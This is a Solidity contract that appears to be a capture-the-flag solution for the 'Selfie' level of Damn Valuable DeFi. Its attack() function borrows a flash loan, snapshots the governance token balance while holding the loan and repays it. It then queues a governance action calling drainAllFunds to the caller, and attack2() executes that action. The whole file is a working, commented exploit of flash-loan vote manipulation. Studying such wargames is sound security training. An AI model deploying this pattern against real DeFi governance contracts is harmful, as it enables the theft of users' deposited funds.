// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";


contract SelfieAttack {
    DamnValuableTokenSnapshot public token;
    SelfiePool public pool;
    SimpleGovernance public gov;

    uint public actionId;

    constructor(address _token, address _pool, address _gov) {
        token = DamnValuableTokenSnapshot(_token);
        pool = SelfiePool(_pool);
        gov = SimpleGovernance(_gov);
    }
    
    fallback() external {
        // STEP 2 - snapshot our current balance and return the loan to the pool
        token.snapshot();
        token.transfer(address(pool), token.balanceOf(address(this)));
    }

    /** EXPLOIT - We can submit a proposal to drain all funds if we use a flash loan to get enough votes. 
        We need to wait two days to execute the proposal, but the governance has no method to cancel queued proposals, so it is inevitable. */
    function attack() external {
        // STEP 1 - flash loan to get all tokens available at the pool
        pool.flashLoan(token.balanceOf(address(pool)));
        // STEP 3 - submit a proposal to drain all funds. We have enough votes to pass the proposal because the last snapshot was taken when we had the loan balance
        actionId = gov.queueAction(
            address(pool),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                address(msg.sender)
            ),
            0
        );
    }

    function attack2() external {
        // STEP 4 - execute action after waiting the delay time. 
        gov.executeAction(actionId);
    }
}